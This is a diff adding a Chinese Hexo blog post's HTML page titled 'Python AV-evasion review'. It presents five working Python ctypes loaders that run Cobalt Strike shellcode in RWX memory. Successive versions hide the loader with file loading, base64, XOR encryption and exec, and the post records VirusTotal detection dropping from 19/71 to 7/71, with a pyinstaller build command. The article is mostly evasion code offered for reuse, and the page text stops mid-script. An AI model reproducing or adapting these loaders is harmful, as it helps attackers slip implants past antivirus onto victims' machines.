@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="cn">
+
+<head>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="This_is_Y">
+    
+    <title>
+        
+            python免杀复习 |
+        
+        This_is_Y
+    </title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="shortcut icon" href="/images/title.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"cn","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":false},"style":{"primary_color":"#33CCCC","avatar":"/images/head.png","favicon":"/images/title.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/Watch.png","description":"Life is but a Dream"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":false},"version":"3.4.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+</head>
+
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                This_is_Y
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories/cnblogs"
+                            >
+                                CNBLOGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/Game"
+                            >
+                                GAME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/ReShell"
+                            >
+                                SHELL
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories/cnblogs">CNBLOGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/Game">GAME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/ReShell">SHELL</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">python免杀复习</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/head.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">This_is_Y</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2022-07-29 01:35:59
+    </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>最基础的版本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">py3loader</span>(<span class="params">shellcode</span>):</span></span><br><span class="line">        shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line">        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">        ptr = ctypes.windll.kernel32.VirtualAlloc(</span><br><span class="line">                ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                ctypes.c_int(<span class="built_in">len</span>(shellcode)),</span><br><span class="line">                ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                ctypes.c_int(<span class="number">0x40</span>)</span><br><span class="line">        )</span><br><span class="line">        buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">        ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">                ctypes.c_uint64(ptr),</span><br><span class="line">                buf,</span><br><span class="line">                ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">        )</span><br><span class="line">        handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">                ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                ctypes.c_uint64(ptr),</span><br><span class="line">                ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">        )</span><br><span class="line">        ctypes.windll.kernel32.WaitForSingleObject(</span><br><span class="line">                ctypes.c_int(handle),</span><br><span class="line">                ctypes.c_int(-<span class="number">1</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode 为cs的 python x64</span></span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00&quot;</span></span><br><span class="line">py3loader(buf)</span><br></pre></td></tr></table></figure>
+<p>一个加载器，一个shellcode，编译用的pyisntaller，5mb左右，火绒秒杀</p>
+<p>pyinstaller –noconsole –icon xxx.ico –onefile loader.py</p>
+<p><strong>19 / 71</strong>  <a class="link" target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/8a7c2741dc2755b16e29ab4d508fbf8bd9db5320a55aba54bb4c1a0196aeb6cd?nocache=1">https://www.virustotal.com/gui/file/8a7c2741dc2755b16e29ab4d508fbf8bd9db5320a55aba54bb4c1a0196aeb6cd?nocache=1<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="image-20220729232303195.png" alt="image-20220729232303195"></p>
+<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>稍微修改了一下，修改的地方在import这里，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_int,c_uint64,windll,c_char,pointer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">py3loader2</span>(<span class="params">shellcode</span>):</span></span><br><span class="line">        shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line">        windll.kernel32.VirtualAlloc.restype = c_uint64</span><br><span class="line">        ptr = windll.kernel32.VirtualAlloc(</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="built_in">len</span>(shellcode)),</span><br><span class="line">                c_int(<span class="number">0x3000</span>),</span><br><span class="line">                c_int(<span class="number">0x40</span>)</span><br><span class="line">        )</span><br><span class="line">        buf = (c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">        windll.kernel32.RtlMoveMemory(</span><br><span class="line">                c_uint64(ptr),</span><br><span class="line">                buf,</span><br><span class="line">                c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">        )</span><br><span class="line">        handle = windll.kernel32.CreateThread(</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_uint64(ptr),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                pointer(c_int(<span class="number">0</span>))</span><br><span class="line">        )</span><br><span class="line">        windll.kernel32.WaitForSingleObject(</span><br><span class="line">                c_int(handle),</span><br><span class="line">                c_int(-<span class="number">1</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode 为cs的 python x64</span></span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83\xe4…………\x69\xa0\x8d&quot;</span></span><br><span class="line">py3loader2(buf)</span><br></pre></td></tr></table></figure>
+
+<p>就一个加载器，一个shellcode，用pyinstaller编译后大概5mb。火绒秒杀</p>
+<p><strong>9/71</strong> <a class="link" target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/8fae57723e3eb442bd4fea37c93deec076bd026d834c801fafb8b88bee8e4c53">https://www.virustotal.com/gui/file/8fae57723e3eb442bd4fea37c93deec076bd026d834c801fafb8b88bee8e4c53<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="image-20220729231200599.png" alt="image-20220729231200599"></p>
+<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>在2的基础上，把shellcode拿出来了，做了一个读文件，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_int,c_uint64,windll,c_char,pointer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">py3loader2</span>(<span class="params">shellcode</span>):</span></span><br><span class="line">        shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line">        windll.kernel32.VirtualAlloc.restype = c_uint64</span><br><span class="line">        ptr = windll.kernel32.VirtualAlloc(</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="built_in">len</span>(shellcode)),</span><br><span class="line">                c_int(<span class="number">0x3000</span>),</span><br><span class="line">                c_int(<span class="number">0x40</span>)</span><br><span class="line">        )</span><br><span class="line">        buf = (c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">        windll.kernel32.RtlMoveMemory(</span><br><span class="line">                c_uint64(ptr),</span><br><span class="line">                buf,</span><br><span class="line">                c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">        )</span><br><span class="line">        handle = windll.kernel32.CreateThread(</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_uint64(ptr),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                pointer(c_int(<span class="number">0</span>))</span><br><span class="line">        )</span><br><span class="line">        windll.kernel32.WaitForSingleObject(</span><br><span class="line">                c_int(handle),</span><br><span class="line">                c_int(-<span class="number">1</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;loadpay&quot;</span>,<span class="string">&#x27;r&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    buf = f.read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;buf = b&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(buf))</span><br><span class="line"></span><br><span class="line">py3loader2(buf)</span><br></pre></td></tr></table></figure>
+<p>编译，效果一般，还更差了。</p>
+<p><strong>29/ 71</strong>  <a class="link" target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/7ce8b35e3175fa4772b7e5226fed57dc063e2242eefd91ede0c79bfc341675a7">https://www.virustotal.com/gui/file/7ce8b35e3175fa4772b7e5226fed57dc063e2242eefd91ede0c79bfc341675a7<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="image-20220729232615613.png" alt="image-20220729232615613"></p>
+<h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>在3的基础上，对代码进行编码，之后再解码运行，<br>spawn.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">txt = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def py3loader2(shellcode):</span></span><br><span class="line"><span class="string">        shellcode = bytearray(shellcode)</span></span><br><span class="line"><span class="string">        windll.kernel32.VirtualAlloc.restype = c_uint64</span></span><br><span class="line"><span class="string">        ptr = windll.kernel32.VirtualAlloc(</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_int(len(shellcode)),</span></span><br><span class="line"><span class="string">                c_int(0x3000),</span></span><br><span class="line"><span class="string">                c_int(0x40)</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">        buf = (c_char * len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="string">        windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="string">                c_uint64(ptr),</span></span><br><span class="line"><span class="string">                buf,</span></span><br><span class="line"><span class="string">                c_int(len(shellcode))</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">        handle = windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_uint64(ptr),</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                pointer(c_int(0))</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">        windll.kernel32.WaitForSingleObject(</span></span><br><span class="line"><span class="string">                c_int(handle),</span></span><br><span class="line"><span class="string">                c_int(-1)</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">with open(&quot;loadpay&quot;,&#x27;r&#x27;)as f:</span></span><br><span class="line"><span class="string">        buf = f.read()</span></span><br><span class="line"><span class="string">exec(&quot;buf = b&#x27;&#123;&#125;&#x27;&quot;.format(buf))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">py3loader2(buf)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> a64en</span><br><span class="line">t = a64en(txt.encode())</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>运行spawn.py生成一串base64编码后的字符串，然后放在下面的代码里。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> a64de</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_int,c_uint64,windll,c_char,pointer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asdf</span>(<span class="params">qwer</span>):</span></span><br><span class="line">        <span class="built_in">exec</span>(qwer)</span><br><span class="line">qwer = a64de(<span class="string">b&#x27;CmRlZiBweTNsb2FkZX………………dWYpCg==&#x27;</span>)</span><br><span class="line">asdf(qwer)</span><br></pre></td></tr></table></figure>
+
+<p>再编译该文件，还是5m<br><strong>7/ 71</strong><br><a class="link" target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/50514eed6469eec609b0a76b3db0e3ec051407d7dcd464b1093a63470b33afce">https://www.virustotal.com/gui/file/50514eed6469eec609b0a76b3db0e3ec051407d7dcd464b1093a63470b33afce<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="image-20220729233506022.png" alt="image-20220729233506022"></p>
+<h1 id="5"><a href="#5" class="headerlink" title="5"></a>5</h1><p>在晚上随便找了一个异或加密的算法，<br>spawn.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">txt = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def py3loader2(shellcode):</span></span><br><span class="line"><span class="string">        shellcode = bytearray(shellcode)</span></span><br><span class="line"><span class="string">        windll.kernel32.VirtualAlloc.restype = c_uint64</span></span><br><span class="line"><span class="string">        ptr = windll.kernel32.VirtualAlloc(</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_int(len(shellcode)),</span></span><br><span class="line"><span class="string">                c_int(0x3000),</span></span><br><span class="line"><span class="string">                c_int(0x40)</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">        buf = (c_char * len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="string">        windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="string">                c_uint64(ptr),</span></span><br><span class="line"><span class="string">                buf,</span></span><br><span class="line"><span class="string">                c_int(len(shellcode))</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">        handle = windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_uint64(ptr),</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                c_int(0),</span></span><br><span class="line"><span class="string">                pointer(c_int(0))</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">        windll.kernel32.WaitForSingleObject(</span></span><br><span class="line"><span class="string">                c_int(handle),</span></span><br><span class="line"><span class="string">                c_int(-1)</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">with open(&quot;loadpay&quot;,&#x27;r&#x27;)as f:</span></span><br><span class="line"><span class="string">        buf = f.read()</span></span><br><span class="line"><span class="string">exec(&quot;buf = b&#x27;&#123;&#125;&#x27;&quot;.format(buf))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">py3loader2(buf)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> a64en</span><br><span class="line">t = a64en(txt.encode())</span><br><span class="line">key = <span class="string">&#x27;this_is_y&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_crypt</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    cipher_data = []</span><br><span class="line">    len_data = <span class="built_in">len</span>(data)</span><br><span class="line">    len_key = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(len_data):</span><br><span class="line">        bias = key[idx % len_key]</span><br><span class="line">        curr_byte = data[idx]</span><br><span class="line">        cipher_data.append(bias ^ curr_byte)</span><br><span class="line">    <span class="keyword">return</span> a64en(<span class="built_in">bytearray</span>(cipher_data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xort = xor_crypt(t,key.encode())</span><br><span class="line"><span class="built_in">print</span>(xort)</span><br></pre></td></tr></table></figure>
+<p>原理和4其实一样，多了一次亦或加密罢了，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> a64de</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_int,c_uint64,windll,c_char,pointer</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asdf</span>(<span class="params">qwer</span>):</span></span><br><span class="line">        <span class="built_in">exec</span>(qwer)</span><br><span class="line">key = <span class="string">&#x27;this_is_y&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_crypt</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    cipher_data = []</span><br><span class="line">    len_data = <span class="built_in">len</span>(data)</span><br><span class="line">    len_key = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(len_data):</span><br><span class="line">        bias = key[idx % len_key]</span><br><span class="line">        curr_byte = data[idx]</span><br><span class="line">        cipher_data.append(bias ^ curr_byte)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(cipher_data)</span><br><span class="line"></span><br><span class="line">qwer = a64de(<span class="string">b&#x27;NwU7HwUAMSgcICYaEW0vGAU……………………SUAGzYNJAYJNw9UTg==&#x27;</span>)</span><br><span class="line">qwer = xor_crypt(qwer,key.encode())</span><br><span class="line">qwer = a64de(qwer)</span><br><span class="line">asdf(qwer)</span><br></pre></td></tr></table></figure>
+<p>编译后还是5mb多点，效果没变化。就这样吧<br><strong>7/71</strong>    <a class="link" target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/984a384d97124e6d12c4dace0416b8f22df8be1bdb329566bdc228c4046cfe98?nocache=1">https://www.virustotal.com/gui/file/984a384d97124e6d12c4dace0416b8f22df8be1bdb329566bdc228c4046cfe98?nocache=1<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="image-20220729233841390.png" alt="image-20220729233841390"></p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/07/29/go%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">go免杀笔记</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/07/04/cron%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">cron计划任务后门</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;Comments</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script data-pjax
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'pnLUL03RCIjbXBNX6m4sBrtq-gzGzoHsz',
+                    appKey: 'itjAi31G55tfhpSKJiuLDe2g',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '生命是上天的馈赠，我不想虚度年华',
+                    lang: 'cn'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = 'This_is_Y';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
